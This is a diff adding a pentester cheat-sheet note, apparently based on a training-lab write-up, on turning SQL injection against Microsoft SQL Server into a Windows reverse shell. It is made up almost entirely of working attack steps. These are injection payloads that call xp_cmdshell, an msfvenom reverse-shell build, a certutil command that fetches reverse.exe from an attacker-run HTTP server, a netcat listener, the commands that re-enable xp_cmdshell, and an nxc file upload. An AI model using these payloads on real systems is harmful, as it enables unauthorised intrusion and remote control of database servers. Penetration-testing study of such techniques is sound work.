@@ -1,0 +1,43 @@
+When you find a SQL injection, one way attack you can do is through utilizing "xp_cmdshell, which is a stored procedure in Microsoft SQL Server that allows command and programs to be executed within the server."
+Check if code execution is working without errors using xp_cmdshell
+' UNION SELECT NULL, NULL; EXEC xp_cmdshell 'cmd /c whoami' --
+if there was no error, then the xp_cmdshell should be running it correctly. Craft a reverse shell over 443.
+msfvenom -p windows/shell_reverse_tcp LHOST=(AttackBox IP Here) LPORT=443 -f exe -o reverse.exe
+start a http server
+python3 -m http.server -p 80
+Use SQLi to download the reverse.exe from your httpserver
+' UNION SELECT NULL, NULL; EXEC xp_cmdshell 'cmd /c certutil -urlcache -f http://192.168.45.230/reverse.exe C:\Windows\Temp\reverse.exe' --
+Start nc listener
+nc -lvnp 443
+execute the reverse shell and catch it with the listener.
+' UNION SELECT NULL, NULL; EXEC xp_cmdshell 'cmd /c C:\Windows\Temp\reverse.exe
+How to activate xp_cmdshell
+USE master;
+GO
+
+EXECUTE sp_configure 'show advanced options', 1;
+GO
+
+RECONFIGURE;
+GO
+
+EXECUTE sp_configure 'xp_cmdshell', 1;
+GO
+
+RECONFIGURE;
+GO
+
+EXECUTE sp_configure 'show advanced options', 0;
+GO
+
+RECONFIGURE;
+GO
+good article to read:
+https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
+nxc
+
+nxc mssql x.x.x.x -u 'user' -p 'password' -put-file reverse.exe c:\windows\temp\reverse.exe
+References:
+https://medium.com/@jhollandcyber/sql-injection-thms-advent-of-cyber-day-ten-write-up-77c9dda63917
+https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16
+https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
